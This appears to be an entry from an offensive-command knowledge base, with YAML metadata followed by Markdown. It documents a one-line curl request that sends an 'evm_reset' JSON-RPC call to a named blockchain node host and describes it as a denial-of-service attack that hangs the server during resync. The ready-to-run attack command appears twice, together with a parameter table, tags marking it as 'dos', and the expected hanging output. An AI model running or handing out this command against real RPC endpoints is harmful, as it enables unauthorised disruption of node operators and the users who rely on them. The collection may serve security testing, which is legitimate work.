---
id: cmd-003
data: >-
  curl -s -X POST -H "Content-Type: application/json" -d
  '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}'
  https://bounty-node.rsk.co
tags:
  - dos
  - reset
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.635Z'
verified: false
validated: true
submitted: true
---
# RPC EVM Reset Trigger

## Command

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co
```

## Description

Triggers EVM reset via JSON-RPC, exploiting misconfigurations to cause DoS by hanging the server during resync.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -s | Silent mode | Yes |
| -X POST | POST method | Yes |
| -H "Content-Type: application/json" | JSON header | Yes |
| -d '{...}' | Reset payload | Yes |
| https://bounty-node.rsk.co | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co
```

## Expected Output

No response; request hangs due to server overload.

## Related

- [[commands/rpc-evm-snapshot-create]]
- [[procedures/Trigger-EVM-Reset-DoS]]
